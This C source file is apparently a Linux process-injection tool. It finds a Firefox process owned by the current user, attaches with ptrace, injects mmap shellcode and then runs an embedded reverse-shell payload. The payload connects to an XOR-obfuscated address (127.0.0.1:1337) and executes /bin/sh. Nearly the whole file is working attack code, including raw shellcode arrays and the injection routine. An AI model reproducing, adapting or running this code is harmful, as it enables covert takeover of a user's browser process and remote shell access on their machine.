#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <fcntl.h>
#include <time.h>

#include <sys/ptrace.h>
#include <sys/wait.h>

#include <sys/user.h>

#define CMDLINESZ 2048
#define PAGESZ 4096
#define DELIM "Uid:\x09"



typedef struct addr_t{
        unsigned long *start_address;
        unsigned long *mmaped_address;
        int page_sz;
}ADDRESS, *PADDRESS;

//This is used to store the process
typedef struct process{
        pid_t pid;
        char proc_name[CMDLINESZ];
}PROCESS, *PPROCESS;

//This is supposed to enumerate and get all the currently running processes that are stored in /proc
PPROCESS enumProcs();
//This function injects into a process
int processInject(PPROCESS process);

//This is used to find a r-xp region in memory to write shellcode
PADDRESS enumAddress(pid_t pid);

void dataWrite(pid_t pid, unsigned long *dest, unsigned long *src, size_t len);
void dataRead(pid_t pid, unsigned long *dest, unsigned long *src, size_t len); //This will read data/code from the target process into memory


//A shellcode for a remote MMAP() to get a chunk from the injected into process

unsigned char remote_mmap[] = 
"\x6a\x22\x41\x5a\x6a\xff\x41\x58\x45\x31\xc9"
"\x31\xff\x6a\x07\x5a\xbe\x01\x01\x01\x01"
"\x81\xf6\x01\x11\x01\x01\x6a\x09\x58\x0f\x05\xcc";

//The shellcode to inject to the process
unsigned char shellcode[] = {0x48, 0x31, 0xff, 0x48, 0x83, 0xcf, 0x38, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x48, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x6a, 0x38, 0x58, 0xf, 0x5, 0x48, 0x83, 0xf8, 0x00, 0x74, 0x01, 0xcc, 0x6a, 0x29, 0x58, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x99, 0x0f, 0x05, 0x49, 0x89, 0xc2, 0x48, 0xb8, 0x01, 0x01, 0x01, 0x01, 0x01, 0x1, 0x1, 0x2, 0x50, 0x48, 0xb8, 0x3, 0x1, 0x4, 0x38, 0x7e, 0x1, 0x1, 0x3, 0x48, 0x31, 0x4, 0x24, 0x6a, 0x2a, 0x58, 0x4c, 0x89, 0xd7, 0x6a, 0x10, 0x5a, 0x48, 0x89, 0xe6, 0x0f, 0x5, 0x48, 0x31, 0xf6, 0x4c, 0x89, 0xd7, 0x6a, 0x21, 0x58, 0xf, 0x5, 0x48, 0xff, 0xc6, 0x6a, 0x21, 0x58, 0xf, 0x5, 0x48, 0xff, 0xc6, 0x6a, 0x21, 0x58, 0xf, 0x5, 0x48, 0x31, 0xd2, 0x52, 0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0, 0x3b, 0x0, 0x0, 0x0, 0xf, 0x5};




unsigned char shellz[] = {0x6a, 0x29, 0x58, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x99, 0x0f, 0x05, 0x48, 0x89, 0xc5, 0x48, 0xb8, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x02, 0x50, 0x48, 0xb8, 0x03, 0x01, 0x04, 0x38, 0x7e, 0x01, 0x01, 0x03, 0x48, 0x31, 0x04, 0x24, 0x6a, 0x2a, 0x58, 0x48, 0x89, 0xef, 0x6a, 0x10, 0x5a, 0x48, 0x89, 0xe6, 0x0f, 0x05};

void dataWrite(pid_t pid, unsigned long *dest, unsigned long *src, size_t len){
        for(size_t i = 0; i < len; i+= 8, dest++, src++){
                if(ptrace(PTRACE_POKETEXT, pid, dest, *src) < 0){
                        perror("[!] ptrace() write error!\n");
                        _exit(-1);
                }
        }
}


void dataRead(pid_t pid, unsigned long *dest, unsigned long *src, size_t len){
        for(size_t i = 0; i < len; i += sizeof(unsigned long), dest++, src++){
                *dest = (unsigned long) ptrace(PTRACE_PEEKTEXT, pid, src, NULL);

        }
}

PADDRESS enumAddress(pid_t pid){
        char filename[CMDLINESZ];
        FILE *fp;
        unsigned char line[1024];
        unsigned char str[20], perms[0x5];

        PADDRESS paddr = (PADDRESS) calloc(1, sizeof(ADDRESS));


        snprintf(filename, sizeof(filename), "/proc/%d/maps", pid);
        fprintf(stdout, "[+] Parsing: %s\n", filename);

        fp = fopen(filename, "r");
        if (fp == NULL){fprintf(stderr, "[!] Error Opening: %s\n\n", filename); goto end;}

        while(fgets(line, sizeof(line), fp) != NULL){
                sscanf(line, "%lx-%*lx %s %*s", &paddr->start_address, perms);
                if(strstr(perms, "x")){ break; }
        }


        return paddr;

end:
        return NULL;
}


int processInject(PPROCESS process){
        pid_t pid = process->pid;
        int status;
        struct user_regs_struct oldregs, regs;

        unsigned long *backup = (unsigned long *) calloc(1, sizeof(remote_mmap));
        unsigned long *mmap_addr = NULL;


        fprintf(stdout, "[+] Injecting into: %s (%d)\n", process->proc_name, pid);

        //attach to the target process
        ptrace(PTRACE_ATTACH, pid, NULL, NULL);
        waitpid(pid, &status, WUNTRACED); //wait for the process to pause executionz

        fprintf(stdout, "[+] Attached to the process!\n");

        //get the value of the registers
        ptrace(PTRACE_GETREGS, pid, NULL, &oldregs);
        //memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));

        PADDRESS address = enumAddress(pid);

        if(address == NULL) goto end;


        //Read OLD data from the return address above
        dataRead(pid, backup, address->start_address, sizeof(remote_mmap));
        fprintf(stderr, "[+] Data backup complete!\n\n");

        //shellcode injection into this address.
        dataWrite(pid, address->start_address, (unsigned long *) remote_mmap, sizeof(remote_mmap));

        //update RIP to point to our 'shellcode'

        regs.rip = (unsigned long) address->start_address;

        //fprintf(stdout, "[+] RIP: %p\n", address->start_address);

        //set registers to the new registers
        ptrace(PTRACE_SETREGS, pid, NULL, &regs);

        //continue execution
        ptrace(PTRACE_CONT, pid, NULL, NULL);
        waitpid(pid, &status, WUNTRACED);


        if(WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP){
                fprintf(stderr, "[+] Mmap() execution was success!!\n");

                ptrace(PTRACE_GETREGS, pid, NULL, &regs);

                //If the address returned by `mmap` is invalid, restore process defaults and check the next process
                if((long) regs.rax < 0) {
                        dataWrite(pid, address->start_address, (unsigned long *) backup, sizeof(remote_mmap));
                        ptrace(PTRACE_SETREGS, pid, NULL, &oldregs);
                        ptrace(PTRACE_DETACH, pid, NULL, NULL);

                        goto end;
                };

                address->mmaped_address = (unsigned long *) regs.rax;
                fprintf(stderr, "[+] mmap'd address: %p\n", address->mmaped_address);

                goto shellcodeExec;

        }

shellcodeExec:
        /* ----- Write and Execute shellcode stored in the newly mmap'd region ----*/
        dataWrite(pid, address->mmaped_address, (unsigned long *) shellcode, sizeof(shellcode));

        memset(&regs, 0, sizeof(struct user_regs_struct));

        regs.rip = (unsigned long) address->mmaped_address;

        ptrace(PTRACE_SETREGS, pid, NULL, &regs);
        fprintf(stdout, "[+] Shellcode Execution @ %p\n", regs.rip);
        ptrace(PTRACE_CONT, pid, NULL, NULL);

        bzero(&status, sizeof(int));
        waitpid(pid, &status, WUNTRACED);

        if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) goto cleanup;


cleanup:
        dataWrite(pid, address->start_address, (unsigned long *)backup, sizeof(remote_mmap));

        //Restores registers and detach from the attached process

        ptrace(PTRACE_SETREGS, pid, NULL, &oldregs);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);


        return 1;
end:
        return 0;
}


PPROCESS enumProcs(){
        PPROCESS head = NULL;

        DIR *dir = opendir("/proc");

        if(!dir) return NULL;

        struct dirent *e;

        //This is used to return all the live processes (PIDz)
        while((e=readdir(dir)) != NULL){
                if(!atoi(e->d_name) || e->d_type != DT_DIR) continue;
                //Determine the owner of the process and compare this to ours

                char path[CMDLINESZ];
                snprintf(path, sizeof(path), "/proc/%s/status", e->d_name);

                //read this file to find the process id 

                char buffer[CMDLINESZ * 2];

                int fd = open(path, O_RDONLY);
                if (fd < 0) { close(fd); continue; }

                int readsz = read(fd, buffer, sizeof(buffer));

                if(readsz < 0) continue;
                char *needle = strstr(buffer, DELIM);
                int uid = atoi(strtok(needle+strlen(DELIM), "\t"));

                //if this process is not owned by us; continue to the next process
                if(uid != getuid()) continue;

                memset(path, 0, sizeof(path)); memset(buffer, 0, sizeof(buffer)); close(fd);
                snprintf(path, sizeof(path), "/proc/%s/cmdline", e->d_name);

                fd = open(path, O_RDONLY);
                if(fd < 0){ close(fd); closedir(dir); return NULL; }

                readsz = read(fd, buffer, sizeof(buffer));
                if(readsz <= 0) continue;

                if(strstr(buffer, "firefox") == NULL) continue;
                PPROCESS process = (PPROCESS) malloc(sizeof(PROCESS));
                memset(process, 0, sizeof(PROCESS));

                if(process == NULL) continue;

                //copy the details in memory
                process->pid = atoi(e->d_name);
                strncpy(process->proc_name, buffer, CMDLINESZ);

                //initiate process injection
                if(processInject(process) == 0){
                        free(process); continue;
                }

                head = process;
                break;
        }
        closedir(dir);
        return head;
}


int main(int argc, char **argv){
        PPROCESS process = enumProcs();
        return 0;
}
